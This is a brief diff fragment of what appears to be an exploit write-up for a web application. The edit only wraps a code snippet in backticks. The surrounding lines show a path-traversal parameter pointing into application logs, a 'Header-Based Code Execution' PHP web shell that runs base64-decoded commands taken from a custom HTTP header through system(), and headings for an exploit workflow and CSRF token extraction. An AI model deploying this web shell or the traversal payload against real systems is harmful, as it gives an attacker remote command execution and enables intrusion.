@@ -84,11 +84,11 @@ language=../../application/logs
 Header-Based Code Execution:
 php
 Copy
-<?php 
+```<?php 
 if(isset($_SERVER["HTTP_X_CUSTOM_HEADER"])){
     system(base64_decode($_SERVER["HTTP_X_CUSTOM_HEADER"]));
 }
-
+```
 Exploit Workflow
 
 CSRF token extraction
